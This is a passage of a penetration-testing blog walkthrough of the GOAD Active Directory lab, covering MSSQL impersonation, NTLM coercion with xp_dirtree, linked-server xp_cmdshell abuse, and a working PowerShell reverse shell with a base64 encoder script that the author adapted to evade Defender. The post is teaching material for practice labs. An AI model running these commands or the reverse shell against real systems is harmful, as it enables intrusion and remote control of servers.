</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/mssql_arya_execas_masterdbo.png" alt="mssql_arya_execas_masterdbo.png" /></p><ul><li>but our user also got impersonate user privilege on dbo user on database msdb</ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/mssql_arya_impersonate.png" alt="mssql_arya_impersonate.png" /></p><ul><li>The difference between the two databases is that msdb got the trustworthy property set (default value on msdb).</ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/mssql_arya_db_trustworthy.png" alt="mssql_arya_db_trustworthy.png" /></p><ul><li>With the trustworthy property we get a shell :</ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/mssql_arya_execas_msdbdbo.png" alt="mssql_arya_execas_msdbdbo.png" /></p><h3 id="coerce-and-relay">Coerce and relay</h3><ul><li>Mssql can also be use to coerce an NTLM authentication from the mssql server. The incoming connection will be from the user who run the mssql server.<li>In our case if we tale any user like hodor for example we can get an NTLM authentication<li><p>start responder <code class="language-plaintext highlighter-rouge">responder -I vboxnet0</code></p><li>Connect with hodor (0 privilèges)</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3 mssqlclient.py <span class="nt">-windows-auth</span> north.sevenkingdoms.local/hodor:hodor@castelblack.north.sevenkingdoms.local
</pre></table></code></div></div><ul><li>run a xp_dirtree command :</ul><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">exec</span> <span class="n">master</span><span class="p">.</span><span class="n">sys</span><span class="p">.</span><span class="n">xp_dirtree</span> <span class="s1">'</span><span class="se">\\</span><span class="s1">192.168.56.1</span><span class="se">\d</span><span class="s1">emontlm'</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span>
</pre></table></code></div></div><ul><li>And we get a connection back to our responder</ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/mssql_hodor_relay.png" alt="mssql_hodor_relay.png" /></p><ul><li>This will work also with ntlmrelayx (like with a server running as administrator and with the same password on other servers). But on the lab, this kind of behavior is not setup by now.</ul><h3 id="trusted-links">trusted links</h3><ul><li>Another SQL abuse we could try on the lab, is the usage of mssql trusted links.</ul><blockquote><p>Note that trusted link is also a forest to forest technique</p></blockquote><ul><li>To abuse the links let’s connect with jon.snow and use enum_links</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>python3 mssqlclient.py <span class="nt">-windows-auth</span> north.sevenkingdoms.local/jon.snow:iknownothing@castelblack.north.sevenkingdoms.local <span class="nt">-show</span>
SQL <span class="o">(</span>NORTH<span class="se">\j</span>on.snow  dbo@master<span class="o">)&gt;</span> enum_links
</pre></table></code></div></div><ul><li>This play the following queries :</ul><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="k">EXEC</span> <span class="n">sp_linkedservers</span>
<span class="k">EXEC</span> <span class="n">sp_helplinkedsrvlogin</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/mssql_trusted_links.png" alt="mssql_trusted_links.png" /></p><ul><li><p>As we can see a linked server exist with the name BRAAVOS and a mapping exist with the user jon.snow and sa on braavos.</p><li><p>If we use the link we can get a command injection on braavos:</p></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>use_link BRAAVOS
enable_xp_cmdshell
xp_cmdshell whoami
</pre></table></code></div></div><ul><li>This play the following MSSQL commands :</ul><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="k">EXEC</span> <span class="p">(</span><span class="s1">'select system_user as "username"'</span><span class="p">)</span> <span class="k">AT</span> <span class="n">BRAAVOS</span>
<span class="k">EXEC</span> <span class="p">(</span><span class="s1">'exec master.dbo.sp_configure </span><span class="se">''</span><span class="s1">show advanced options</span><span class="se">''</span><span class="s1">,1;RECONFIGURE;exec master.dbo.sp_configure </span><span class="se">''</span><span class="s1">xp_cmdshell</span><span class="se">''</span><span class="s1">, 1;RECONFIGURE;'</span><span class="p">)</span> <span class="k">AT</span> <span class="n">BRAAVOS</span>
<span class="k">EXEC</span> <span class="p">(</span><span class="s1">'exec master..xp_cmdshell </span><span class="se">''</span><span class="s1">whoami</span><span class="se">''</span><span class="s1">'</span><span class="p">)</span> <span class="k">AT</span> <span class="n">BRAAVOS</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/mssql_trusted_links_exec.png" alt="mssql_trusted_links_exec.png" /></p><ul><li><p>We got a command injection on braavos.essos.local as essos\sql_svc</p><li><p>I have done the modifications on mssqlclient.py to be able to chain trusted_links. From this we can continue to another trusted link, etc…</p><li><p>Example :</p></ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/mssql_trusted_links_exec_chained.png" alt="mssql_trusted_links_exec_chained.png" /></p><h2 id="command-execution-to-shell">Command execution to shell</h2><ul><li>We got command execution on castelblack and also on braavos. But now we want a shell to interact with the server.<li>To get a shell we can use a basic Powershell webshell (There is one available on the <a href="https://github.com/Orange-Cyberdefense/arsenal">arsenal</a> commands cheatsheet project. This is another of my projects that i will need to improve when i get the time, but this script do not bypass defender anymore, so let’s write some modifications):</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span text-data=" Powershell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nv">$c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TCPClient</span><span class="p">(</span><span class="s1">'192.168.56.1'</span><span class="p">,</span><span class="mi">4444</span><span class="p">);</span><span class="w">
</span><span class="nv">$s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$c</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">();[</span><span class="n">byte</span><span class="p">[]]</span><span class="nv">$b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">65535</span><span class="o">|%</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="w">
</span><span class="kr">while</span><span class="p">((</span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$s</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$b</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$b</span><span class="o">.</span><span class="nf">Length</span><span class="p">))</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="mi">0</span><span class="p">){</span><span class="w">
    </span><span class="nv">$d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-TypeName</span><span class="w"> </span><span class="nx">System.Text.ASCIIEncoding</span><span class="p">)</span><span class="o">.</span><span class="nf">GetString</span><span class="p">(</span><span class="nv">$b</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$i</span><span class="p">);</span><span class="w">
    </span><span class="nv">$sb</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">iex</span><span class="w"> </span><span class="nv">$d</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="o">&amp;</span><span class="nx">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-String</span><span class="w"> </span><span class="p">);</span><span class="w">
    </span><span class="nv">$sb</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">text.encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="p">)</span><span class="o">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="nv">$sb</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'ps&gt; '</span><span class="p">);</span><span class="w">
    </span><span class="nv">$s</span><span class="o">.</span><span class="nf">Write</span><span class="p">(</span><span class="nv">$sb</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="nv">$sb</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="w">
    </span><span class="nv">$s</span><span class="o">.</span><span class="nf">Flush</span><span class="p">()</span><span class="w">
</span><span class="p">};</span><span class="w">
</span><span class="nv">$c</span><span class="o">.</span><span class="nf">Close</span><span class="p">()</span><span class="w">
</span></pre></table></code></div></div><ul><li>Let’s convert this powershell command to base64 in utf-16 for powershell</ul><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python
</span><span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
  <span class="k">print</span><span class="p">(</span><span class="s">'usage : %s ip port'</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
  <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">payload</span><span class="o">=</span><span class="s">"""
$c = New-Object System.Net.Sockets.TCPClient('%s',%s);
$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $sb = (iex $d 2&gt;&amp;1 | Out-String );
    $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps&gt; ');
    $s.Write($sb,0,$sb.Length);
    $s.Flush()
};
$c.Close()
"""</span> <span class="o">%</span> <span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>

<span class="n">byte</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-16-le'</span><span class="p">)</span>
<span class="n">b64</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">byte</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"powershell -exec bypass -enc %s"</span> <span class="o">%</span> <span class="n">b64</span><span class="p">.</span><span class="n">decode</span><span class="p">())</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/blog/GOAD/mssql_powershellb64.png" alt="mssql_powershellb64.png" /></p><ul><li>run it and get a shell</ul><p><img data-proofer-ignore data-src="/assets/blog/GOAD/mssql_exec_xpcmdshell_reverse.png" alt="mssql_exec_xpcmdshell_reverse.png" /></p><h2 id="other-tools-to-use">Other tools to use</h2><ul><li>There is some interresting projects to exploit mssql, here is some of them :<ul><li><a href="https://github.com/NetSPI/ESC">https://github.com/NetSPI/ESC</a><li><a href="https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet">https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet</a><li><a href="https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/MSSQL/Program.cs">https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/MSSQL/Program.cs</a></ul><li>Interresting informations :<ul><li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server">https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server</a><li><a href="https://ppn.snovvcrash.rocks/pentest/infrastructure/dbms/mssql">https://ppn.snovvcrash.rocks/pentest/infrastructure/dbms/mssql</a><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md</a><li><a href="https://h4ms1k.github.io/Red_Team_MSSQL_Server/#">https://h4ms1k.github.io/Red_Team_MSSQL_Server/#</a><li><a href="https://github.com/Jean-Francois-C/Database-Security-Audit/blob/master/MSSQL%20database%20penetration%20testing">https://github.com/Jean-Francois-C/Database-Security-Audit/blob/master/MSSQL%20database%20penetration%20testing</a></ul></ul><p>Next time we will have fun with IIS and we will get an nt authority\system shell on servers : (<a href="/posts/GOADv2-pwning-part8/">Goad pwning part8</a>) :)</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ad/'>AD</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ad/" class="post-tag no-text-decoration" >AD,</a> <a href="/tags/lab/" class="post-tag no-text-decoration" >Lab,</a> <a href="/tags/mssql/" class="post-tag no-text-decoration" >MSSQL</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=GOAD - part 7 - MSSQL - Mayfly&url=https://mayfly277.github.io/posts/GOADv2-pwning-part7/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=GOAD - part 7 - MSSQL - Mayfly&u=https://mayfly277.github.io/posts/GOADv2-pwning-part7/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=GOAD - part 7 - MSSQL - Mayfly&url=https://mayfly277.github.io/posts/GOADv2-pwning-part7/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/GOADv2-pwning_part1/">GOAD - part 1 - reconnaissance and scan</a><li><a href="/posts/GOADv2-pwning-part2/">GOAD - part 2 - find users</a><li><a href="/posts/GOADv2-pwning-part3/">GOAD - part 3 - enumeration with user</a><li><a href="/posts/GOADv2-pwning-part4/">GOAD - part 4 - poison and relay</a><li><a href="/posts/GOADv2-pwning-part5/">GOAD - part 5 - exploit with user</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ad/">AD,</a> <a class="post-tag" href="/tags/lab/">Lab,</a> <a class="post-tag" href="/tags/cme/">cme,</a> <a class="post-tag" href="/tags/adcs/">adcs</a> <a class="post-tag" href="/tags/amsi/">AMSI,</a> <a class="post-tag" href="/tags/bloodhound/">bloodhound</a> <a class="post-tag" href="/tags/certipy/">certipy,</a> <a class="post-tag" href="/tags/cve/">CVE,</a> <a class="post-tag" href="/tags/cve-2022-35914/">CVE-2022-35914</a> <a class="post-tag" href="/tags/cve/">CVE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/GOADv2-pwning_part1/"><div class="card-body"> <span class="timeago small" >Jul 3<i class="unloaded">2022-07-03T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>GOAD - part 1 - reconnaissance and scan</h3><div class="text-muted small"><p> The lab is now up and running Goad introduction, let’s do some recon on it. Enumerate Network We will starting the reconnaissance of the Game Of Active Directory environment by searching all the ...</p></div></div></a></div><div class="card"> <a href="/posts/GOADv2-pwning-part2/"><div class="card-body"> <span class="timeago small" >Jul 4<i class="unloaded">2022-07-04T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>GOAD - part 2 - find users</h3><div class="text-muted small"><p> We have done some basic reconnaissance on Goad pwning part1, now we will try to enumerate users and start to hunt credentials. Enumerate DC’s anonymously With CME cme smb 192.168.56.11 --users...</p></div></div></a></div><div class="card"> <a href="/posts/GOADv2-pwning-part3/"><div class="card-body"> <span class="timeago small" >Jul 7<i class="unloaded">2022-07-07T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>GOAD - part 3 - enumeration with user</h3><div class="text-muted small"><p> We found some users on Goad pwning part2, now let see what we can do with those creds. User listing When you get an account on an active directory, the first thing to do is always getting th...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/GOADv2-pwning-part6/" class="btn btn-outline-primary" prompt="Older"><p>GOAD - part 6 - ADCS</p></a> <a href="/posts/GOADv2-pwning-part8/" class="btn btn-outline-primary" prompt="Newer"><p>GOAD - part 8 - Privilege escalation</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/M4yFly">mayfly</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ad/">AD,</a> <a class="post-tag" href="/tags/lab/">Lab,</a> <a class="post-tag" href="/tags/cme/">cme,</a> <a class="post-tag" href="/tags/adcs/">adcs</a> <a class="post-tag" href="/tags/amsi/">AMSI,</a> <a class="post-tag" href="/tags/bloodhound/">bloodhound</a> <a class="post-tag" href="/tags/certipy/">certipy,</a> <a class="post-tag" href="/tags/cve/">CVE,</a> <a class="post-tag" href="/tags/cve-2022-35914/">CVE 2022 35914</a> <a class="post-tag" href="/tags/cve/">CVE</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
